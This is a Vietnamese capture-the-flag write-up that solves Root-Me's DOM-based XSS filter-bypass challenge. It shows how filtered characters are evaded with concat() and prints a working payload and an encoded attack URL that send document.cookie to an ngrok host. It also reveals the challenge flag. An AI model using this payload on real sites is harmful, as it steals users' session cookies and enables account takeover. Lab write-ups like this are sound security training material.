# XSS DOM Based - Filters Bypass
## Solution

Ban đầu  challenge yêu cầu nhập 1 số từ 0 đến 100.


![image](https://user-images.githubusercontent.com/86184794/161006421-6e5d14d3-218f-471d-b5ad-8c952e21ead6.png)

Em thử nhập số 19 thì em được kết quả



![image](https://user-images.githubusercontent.com/86184794/161006517-d8ad7b74-edb7-4789-8807-382fb8e79bf3.png)

Kết quả thông báo rắng input đúng phải là 81.72522614408169


Em thử dùng kết quả này  nhập lại thử

![image](https://user-images.githubusercontent.com/86184794/161006756-8b53b8e4-0bfc-4ba5-9f80-c3da18d6c900.png)


Thì kết quả lại thay  đổi. Vì vậy với định dạng mật khẩu là số thập phân như thế này để đón đúng mật khẩu là điều không thể.

![image](https://user-images.githubusercontent.com/86184794/161007203-54e6a01b-c177-4baf-af74-cc281aa16d16.png)

Em vào DOM Element thì phát hiện đoạn code javacript này. Theo đoạn code này thì khi chúng ta có đoán đúng được mât khẩu thì cũng không có flag. Do đó em sẽ nghĩ tới một hướng khai thác khác là biến number, vì em thấy biến này lưu giá trị mà ta nhập vào.

Qua quá trình test thì em xác định được một số kí tự em cần đã bị lọc đi như ",+,http. Nhưng em có thể thay các kí tự này bằng kí tự khác hoặc bằng hàm có chức năng tương tự.

Ví dụ:

Dấu " có thể thay bằng dấu '

Dấu + thay bằng hàm concat() ở đây input không lọc dấu ()

Chữ http thì em có thể tách ra xong dùng hàm concat để nối lại ví dụ như này 'ht'.concat('tp')

Như vậy ta thực hiện nhập input vào để lừa lấy cookie của server gửi về server ảo của chúng ta.

Payload:

```
'.concat(document.location='ht'.concat('tp://fbca-123-21-33-242.ngrok.io?cookie=').concat(document.cookie)) //
```

Sau convert chuỗi payload này sang url thay giá trị number bằng đường link ta vừa convert

![image](https://user-images.githubusercontent.com/86184794/161013461-3762494f-cad7-4b50-8e99-1a2cb9ff16dc.png)

```
http://challenge01.root-me.org/web-client/ch33/index.php?number=%27.concat%28document.location%3D%27ht%27.concat%28%27tp%3A%2F%2Ffbca-123-21-33-242.ngrok.io%3Fcookie%3D%27%29.concat%28document.cookie%29%29%20%2F%2F
```
Submit link này trong tab contact.

![image](https://user-images.githubusercontent.com/86184794/161013657-f3e9b7a3-f0c3-4207-8737-fe8b1b72118c.png)


Kết quả:

![image](https://user-images.githubusercontent.com/86184794/161013734-279615e2-090c-4f92-bb33-14ab59907d94.png)


Flag: rootme{FilTERS_ByPass_DOm_BASEd_XSS}
